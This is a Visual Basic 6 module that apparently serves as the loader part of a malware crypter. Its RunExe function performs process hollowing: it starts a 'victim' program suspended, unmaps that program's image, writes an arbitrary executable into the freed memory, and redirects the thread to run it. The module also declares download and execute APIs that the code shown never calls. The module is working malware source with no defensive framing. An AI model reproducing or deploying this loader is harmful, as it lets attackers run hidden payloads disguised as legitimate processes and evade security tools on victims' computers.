Attribute VB_Name = "RUNMEM"
Public Declare Function SendMessage Lib "user32" _
  Alias "SendMessageA" ( _
  ByVal hwnd As Long, _
  ByVal wMsg As Long, _
  ByVal wParam As Long, _
  lParam As Any) As Long
Public Const EM_GETLINECOUNT = &HBA
Public Const EM_GETLINE = &HC4
Public Const EM_GETSEL = &HB0
Public Const EM_LINEFROMCHAR = &HC9
Public Const EM_LINEINDEX = &HBB
Public Const EM_LINELENGTH = &HC1
Public Declare Sub CopyMemory Lib "kernel32" Alias _
        "RtlMoveMemory" (lpTo As Any, lpFrom As Any, _
        ByVal lLen As Long)
Public Declare Function URLDownloadToFile Lib "urlmon" _
  Alias "URLDownloadToFileA" ( _
  ByVal pCaller As Long, _
  ByVal szURL As String, _
  ByVal szFileName As String, _
  ByVal dwReserved As Long, _
  ByVal lpfnCB As Long) As Long
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" ( _
  ByVal hwnd As Long, _
  ByVal lpOperation As String, _
  ByVal lpFile As String, _
  ByVal lpParameters As String, _
  ByVal lpDirectory As String, _
  ByVal nShowCmd As Long) As Long

'=======Thread context staff===========
Const SIZE_OF_80387_REGISTERS = 80

Type FLOATING_SAVE_AREA
     ControlWord As Long
     StatusWord As Long
     TagWord As Long
     ErrorOffset As Long
     ErrorSelector As Long
     DataOffset As Long
     DataSelector As Long
     RegisterArea(1 To SIZE_OF_80387_REGISTERS) As Byte
     Cr0NpxState As Long
End Type

Public Type CONTEXT86
    ContextFlags As Long
'These are selected by CONTEXT_DEBUG_REGISTERS
    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long
'These are selected by CONTEXT_FLOATING_POINT
    FloatSave As FLOATING_SAVE_AREA
'These are selected by CONTEXT_SEGMENTS
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
'These are selected by CONTEXT_INTEGER
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
'These are selected by CONTEXT_CONTROL
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Public Const CONTEXT_X86 = &H10000
Public Const CONTEXT86_CONTROL = (CONTEXT_X86 Or &H1)          'SS:SP, CS:IP, FLAGS, BP
Public Const CONTEXT86_INTEGER = (CONTEXT_X86 Or &H2)          'AX, BX, CX, DX, SI, DI
Public Const CONTEXT86_SEGMENTS = (CONTEXT_X86 Or &H4)         'DS, ES, FS, GS
Public Const CONTEXT86_FLOATING_POINT = (CONTEXT_X86 Or &H8)   '387 state
Public Const CONTEXT86_DEBUG_REGISTERS = (CONTEXT_X86 Or &H10) 'DB 0-3,6,7
Public Const CONTEXT86_FULL = (CONTEXT86_CONTROL Or CONTEXT86_INTEGER Or CONTEXT86_SEGMENTS)

Public Declare Function GetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT86) As Long
Public Declare Function SetThreadContext Lib "kernel32" (ByVal hThread As Long, lpContext As CONTEXT86) As Long
Public Declare Function SuspendThread Lib "kernel32" (ByVal hThread As Long) As Long
Public Declare Function ResumeThread Lib "kernel32" (ByVal hThread As Long) As Long

Private Type OPENFILENAME 'Open & Save Dialog
    lStructSize As Long
    hwndOwner As Long
    hInstance As Long
    lpstrFilter As String
    lpstrCustomFilter As String
    nMaxCustFilter As Long
    nFilterIndex As Long
    lpstrFile As String
    nMaxFile As Long
    lpstrFileTitle As String
    nMaxFileTitle As Long
    lpstrInitialDir As String
    lpstrTitle As String
    flags As Long
    nFileOffset As Integer
    nFileExtension As Integer
    lpstrDefExt As String
    lCustData As Long
    lpfnHook As Long
    lpTemplateName As String
End Type

Private Const OFN_OVERWRITEPROMPT = &H2
Private Const OFN_HIDEREADONLY = &H4
Private Const OFN_HELPBUTTON = &H10
Private Const OFN_ENABLEHOOK = &H20
Private Const OFN_ENABLETEMPLATE = &H40
Private Const OFN_PATHMUSTEXIST = &H800
Private Const OFN_FILEMUSTEXISTS = &H1000
Private Const OFN_EXPLORER = &H80000
'OFN_EXPLORER OR OFN_FILEMUSTEXISTS
Private Const OFN_OPENFLAGS = &H81000
'OFN_OPENFLAGS OR OFN_OVERWRITEPROMPT AND NOT OFN_FILEMUSTEXIST
Private Const OFN_SAVEFLAGS = &H80002


Public Const MAX_PATH = 260
Private Declare Function GetOpenFileName Lib "comdlg32.dll" Alias "GetOpenFileNameA" (pOpenfilename As OPENFILENAME) As Long
Private Declare Function GetSaveFileName Lib "comdlg32.dll" Alias "GetSaveFileNameA" (pOpenfilename As OPENFILENAME) As Long

'========Process creation and memory access staff=========
Public Type PROCESS_INFORMATION
   hProcess As Long
   hThread As Long
   dwProcessId As Long
   dwThreadId As Long
End Type

Public Type STARTUPINFO
   cb As Long
   lpReserved As String
   lpDesktop As String
   lpTitle As String
   dwX As Long
   dwY As Long
   dwXSize As Long
   dwYSize As Long
   dwXCountChars As Long
   dwYCountChars As Long
   dwFillAttribute As Long
   dwFlags As Long
   wShowWindow As Integer
   cbReserved2 As Integer
   lpReserved2 As Long        'LPBYTE
   hStdInput As Long
   hStdOutput As Long
   hStdError As Long
End Type

Public Declare Function CreateProcess Lib "kernel32" Alias "CreateProcessA" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Public Declare Function ZwUnmapViewOfSection Lib "ntdll.dll" (ByVal hProcess As Long, ByVal BaseAddress As Long) As Long
Public Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Public Declare Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Public Declare Function VirtualProtectEx Lib "kernel32" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Public Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Public Const CREATE_SUSPENDED = &H4
Public Const MEM_COMMIT As Long = &H1000&
Public Const MEM_RESERVE As Long = &H2000&
Public Const PAGE_NOCACHE As Long = &H200
Public Const PAGE_EXECUTE_READWRITE As Long = &H40
Public Const PAGE_EXECUTE_WRITECOPY As Long = &H80
Public Const PAGE_EXECUTE_READ As Long = &H20
Public Const PAGE_EXECUTE As Long = &H10
Public Const PAGE_READONLY As Long = &H2
Public Const PAGE_WRITECOPY As Long = &H8
Public Const PAGE_NOACCESS As Long = &H1
Public Const PAGE_READWRITE As Long = &H4


'========Main staff for any API code :)===========

'==========PE staff==============
Private Enum ImageSignatureTypes
    IMAGE_DOS_SIGNATURE = &H5A4D     ''\\ MZ
    IMAGE_OS2_SIGNATURE = &H454E     ''\\ NE
    IMAGE_OS2_SIGNATURE_LE = &H454C  ''\\ LE
    IMAGE_VXD_SIGNATURE = &H454C     ''\\ LE
    IMAGE_NT_SIGNATURE = &H4550      ''\\ PE00
End Enum

Private Type IMAGE_DOS_HEADER
    e_magic As Integer        ' Magic number
    e_cblp As Integer         ' Bytes on last page of file
    e_cp As Integer           ' Pages in file
    e_crlc As Integer         ' Relocations
    e_cparhdr As Integer      ' Size of header in paragraphs
    e_minalloc As Integer     ' Minimum extra paragraphs needed
    e_maxalloc As Integer     ' Maximum extra paragraphs needed
    e_ss As Integer           ' Initial (relative) SS value
    e_sp As Integer           ' Initial SP value
    e_csum As Integer         ' Checksum
    e_ip As Integer           ' Initial IP value
    e_cs As Integer           ' Initial (relative) CS value
    e_lfarlc As Integer       ' File address of relocation table
    e_ovno As Integer         ' Overlay number
    e_res(0 To 3) As Integer  ' Reserved words
    e_oemid As Integer        ' OEM identifier (for e_oeminfo)
    e_oeminfo As Integer      ' OEM information; e_oemid specific
    e_res2(0 To 9) As Integer ' Reserved words
    e_lfanew As Long          ' File address of new exe header
End Type

' MSDOS File header
Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

' Directory format.
Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

' Optional header format.
Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16

Private Type IMAGE_OPTIONAL_HEADER
    ' Standard fields.
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

' Section header
Const IMAGE_SIZEOF_SHORT_NAME = 8

Private Type IMAGE_SECTION_HEADER
   SecName As String * IMAGE_SIZEOF_SHORT_NAME
   VirtualSize As Long
   VirtualAddress  As Long
   SizeOfRawData As Long
   PointerToRawData As Long
   PointerToRelocations As Long
   PointerToLinenumbers As Long
   NumberOfRelocations As Integer
   NumberOfLinenumbers As Integer
   characteristics  As Long
End Type

'=============Code================
Const OFFSET_4 = 4294967296#
Public Function GetFileName(Optional ByVal sFileName As String, Optional ByVal sFilter As String, Optional ByVal sTitle As String, Optional bOpen As Boolean = True) As String
   Dim OFN As OPENFILENAME
   Dim ret As Long
   Dim sExt As String
   With OFN
       .lStructSize = Len(OFN)
        For i = 1 To Len(sFilter)
            If Mid(sFilter, i, 1) = "|" Then
               Mid(sFilter, i, 1) = vbNullChar
            End If
        Next
        sFilter = sFilter & String$(2, 0)
        .lpstrFilter = sFilter
        .lpstrTitle = sTitle
        .lpstrInitialDir = App.Path
        .hInstance = App.hInstance
        .lpstrFile = sFileName & String(MAX_PATH - Len(sFileName), 0)
        .lpstrFileTitle = String(MAX_PATH, 0)
        .nMaxFile = MAX_PATH
   End With
   If bOpen Then
      OFN.flags = OFN.flags Or OFN_OPENFLAGS
      ret = GetOpenFileName(OFN)
   Else
      OFN.flags = OFN.flags Or OFN_SAVEFLAGS
      ret = GetSaveFileName(OFN)
   End If
   If ret Then GetFileName = TrimNull(OFN.lpstrFile)
End Function

Public Function TrimNull(startstr As String) As String
   Dim pos As Integer
   pos = InStr(startstr, Chr$(0))
   If pos Then
      TrimNull = Left$(startstr, pos - 1)
      Exit Function
   End If
   TrimNull = startstr
End Function

Public Function RunExe(ByVal sVictim As String, abExeFile() As Byte) As Long
    Dim idh As IMAGE_DOS_HEADER
    Dim inh As IMAGE_NT_HEADERS
    Dim ish As IMAGE_SECTION_HEADER
    Dim pi As PROCESS_INFORMATION
    Dim si As STARTUPINFO
    Dim context As CONTEXT86
    Dim ImageBase As Long, ret As Long, i As Long
    Dim addr As Long, lOffset As Long
        
    CopyMemory idh, abExeFile(0), Len(idh)
    If idh.e_magic <> IMAGE_DOS_SIGNATURE Then
       MsgBox "MZ signature not found!", vbCritical, "File load error"
       Exit Function
    End If
    CopyMemory inh, abExeFile(idh.e_lfanew), Len(inh)
    If inh.Signature <> IMAGE_NT_SIGNATURE Then
       MsgBox "PE signature not found!", vbCritical, "File load error"
       Exit Function
    End If
    
    si.cb = Len(si)
    If CreateProcess(vbNullString, sVictim, 0, 0, False, CREATE_SUSPENDED, 0, 0, si, pi) = 0 Then
       MsgBox "Can not start victim process!", vbCritical
       Exit Function
    End If
    context.ContextFlags = CONTEXT86_INTEGER
    If GetThreadContext(pi.hThread, context) = 0 Then GoTo ClearProcess
    Call ReadProcessMemory(pi.hProcess, ByVal context.Ebx + 8, addr, 4, 0)
    If addr = 0 Then GoTo ClearProcess
    If ZwUnmapViewOfSection(pi.hProcess, addr) Then GoTo ClearProcess
    ImageBase = VirtualAllocEx(pi.hProcess, ByVal inh.OptionalHeader.ImageBase, inh.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)
    If ImageBase = 0 Then GoTo ClearProcess

    Call WriteProcessMemory(pi.hProcess, ByVal ImageBase, abExeFile(0), inh.OptionalHeader.SizeOfHeaders, ret)
    lOffset = idh.e_lfanew + Len(inh)
    For i = 0 To inh.FileHeader.NumberOfSections - 1
        CopyMemory ish, abExeFile(lOffset + i * Len(ish)), Len(ish)
        Call WriteProcessMemory(pi.hProcess, ByVal ImageBase + ish.VirtualAddress, abExeFile(ish.PointerToRawData), ish.SizeOfRawData, ret)
        Call VirtualProtectEx(pi.hProcess, ByVal ImageBase + ish.VirtualAddress, ish.VirtualSize, Protect(ish.characteristics), addr)
    Next i
    Call WriteProcessMemory(pi.hProcess, ByVal context.Ebx + 8, ImageBase, 4, ret)
    context.Eax = ImageBase + inh.OptionalHeader.AddressOfEntryPoint
    Call SetThreadContext(pi.hThread, context)
    Call ResumeThread(pi.hThread)
    Exit Function
ClearProcess:
    CloseHandle pi.hThread
    CloseHandle pi.hProcess
End Function

Private Function Protect(ByVal characteristics As Long) As Long
   Dim mapping As Variant
   mapping = Array(PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, _
                   PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, _
                   PAGE_READWRITE, PAGE_EXECUTE_READWRITE)
   Protect = mapping(RShift(characteristics, 29))
End Function

Private Function RShift(ByVal lValue As Long, ByVal lNumberOfBitsToShift As Long) As Long
    RShift = vbLongToULong(lValue) / (2 ^ lNumberOfBitsToShift)
End Function

Private Function vbLongToULong(ByVal Value As Long) As Double
    If Value < 0 Then
        vbLongToULong = Value + OFFSET_4
    Else
        vbLongToULong = Value
    End If
End Function




